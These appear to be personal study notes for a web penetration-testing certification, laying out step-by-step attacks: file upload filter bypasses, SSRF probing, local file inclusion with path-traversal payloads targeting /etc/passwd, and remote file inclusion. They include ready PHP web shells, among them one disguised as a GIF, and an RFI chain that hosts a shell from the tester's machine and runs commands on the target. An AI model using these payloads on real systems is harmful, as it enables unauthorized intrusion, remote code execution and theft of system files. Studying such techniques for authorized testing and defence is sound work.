# File Upload Attacks
## Client-Side Validation
If file is validated on client side:
1. Upload a validated file type
2. Capture upload request in Burp
3. Modify `filename` and the file content to your web shell



## Back-End Validation
If file is validated after submission:
1. Capture file upload request and change data to your desired web shell
2. Send captured request to Repeater and test the `filename` extension, `Content-Type` value, and `MIME-Type` individually to see which area the back-end is validating from. 
	- Test each one individually, and all possible combinations of each (ex: allowed `filename` with disallowed `Content-Type` and `MIME-Type` to find exactly what is being tested on the back-end)
3. If one area is validated, but others aren't validated on back-end (`Content-Type`, `filename`, `MIME-Type`), then set all these other values to your desired value and continue testing
	- If `filename` is validated: [[Bypassing Filters#Fuzzing Extensions]]
	- If `Content-Type` is validated: [[Bypassing Filters#Type Filters]]
	- If `MIME-Type` is validated: [[Bypassing Filters#MIME-Type]]

>**MAKE SURE YOU UN-CHECK URL ENCODING WHEN USING INTRUDER!!!!!!!!**



### If `HTML` file uploads are allowed: [[Miscellaneous Upload Attacks#XSS]]
### If `.svg` uploads are allowed: [[Miscellaneous Upload Attacks#XXE]]
### If none of above is working:
Try combining multiple methods. Example:
1. If file needs to end in `.jpg`, name it `.php.jpg`
2. Check if you can change the `Content-Type` now. If not, fuzz the `Content-Type`: [[Bypassing Filters#Fuzzing Content-Type]]



# SSRF Testing (from URL schemes)
If the web application relies on a user-supplied URL scheme or protocol (ex: `http://`, `file://`), such as:
- URL that retrieves data based off user-input
- A button to retrieve data such as; Stock for items, availability for appointments, etc.
## Test for SSRF
1. Send a URL to a listener on our attacking system to confirm vulnerability:
```url
http://10.10.14.17:80/test
```
	- Make sure to have a python listener open on this port when sending this!




## Exploitation
1. Check to see if it scans itself with `http://127.0.0.1:81`
	- If it responds with error saying it couldn't connect, we can scan for all ports with `ffuf`[[Cybersecurity/CBBH Modules/4. File & SSRF Testing/2. SSRF - Server Side Request Forgery/Reference#Enumerating the System]]
2. If we find other services open (ex: `port 25 - SMTP`), we can go through [[Cybersecurity/CBBH Modules/4. File & SSRF Testing/2. SSRF - Server Side Request Forgery/Reference#The gopher Protocol]]
3. Attempt LFI by using `file:////////etc/passwd` to read files
4. If we found that the server fetches information from unauthorized resources on other pages, we can send requests to grab these unauthorized resources
	- Ex: Loading the `/index.php` page sends a GET request to `/assets/js/userdata.js`, which is unauthorized when we attempt to view it
	- We can send a request with our SSRF vulnerability to view the page
	- If we want to FUZZ a URL we dont have access to: [[Cybersecurity/CBBH Modules/4. File & SSRF Testing/2. SSRF - Server Side Request Forgery/Reference#Accessing Restricted Endpoints]]




## Blind Exploitation: [[Cybersecurity/CBBH Modules/4. File & SSRF Testing/2. SSRF - Server Side Request Forgery/Reference#Blind SSRF|Reference]]



# Local File Inclusions
## Identifying Vulnerability
If a file or resource is retrieved through a URL with a `?file=filename` parameter:
1. Try accessing files by appending `?file=filename/../../../../etc/passwd`
2. If this doesn't work, try: `?file=/../../../../etc/passwd`
3. If this doesn't work, try: `?file=filename/....//....//....//....//etc/passwd`
4. If this doesn't work, try: `?file=filename/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
5. If these don't work, try: `?file=./filename/` + all previous payloads, one-by-one



### If our original request retrieves a file
Ex: `?profile-avatar=/profile/$username/avatar.png`
1. Change the name of the file it is requesting to a malicious LFI username to grab other files 
	- Ex: Change profile avatar from `avatar.png` -> `../../../../etc/passwd`
	- When web app requests profile avatar, it will now be: `?profile-avatar=/profile/$username/../../../../etc/passwd`



### If PHP version is < 5.3: [[Basic Bypasses#Appended Extension]]


### Else: [[PHP Filters]]




## RCE through LFI
### Check for RCE through PHP Configurations: [[1. PHP Wrappers#Data]]
Go through [[1. PHP Wrappers#Checking PHP Configurations]] first.
- If enabled, continue with the rest of the entire `Data` Section
- If disabled, skip this section and `Input` section and go to `Expect` section


### If `Data` section doesn't work: [[1. PHP Wrappers#Input]]


### If neither `Data` or `Input` work: [[1. PHP Wrappers#Expect]]





## RFI (Remote File Inclusion)
### Determine if vulnerable
1. Include a URL and see if we can get its content. If we can, it is vulnerable
	- Ex: `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`

### Exploit
1. Create a web reverse shell:
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
2. Host the script with python server:
```shell
sudo python3 -m http.server <LISTENING_PORT>
```
3. Include our local shell through RFI, and specify a command to be executed alongside it:
```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```


#### If HTTP ports are blocked or `http://` is blocked: [[2. Remote File Inclusion (RFI)#FTP]]

#### If vulnerable app is on a Windows server: [[2. Remote File Inclusion (RFI)#SMB]]


## Upload Malicious Files through LFI
1. Identify an endpoint where you can upload files to the server
2. If you can find an upload file section on the server, continue with exploitation
### Exploitation
1. Create a web shell file with the allowed `MIME-Type` and extension and upload it to the web app:
```shell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
2. Find the file path where this is uploaded (ex: right-click it -> Inspect -> find where it is retrieved in the HTML)
3. Include the uploaded file in the LFI vulnerability and the code should get executed:
```html
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
4. If execution doesn't work, go through:
	- [[3. LFI and File Uploads#Zip Upload]] 
	- [[3. LFI and File Uploads#Phar Upload]] 




## If everything fails, go through: [[4. Log Poisoning]]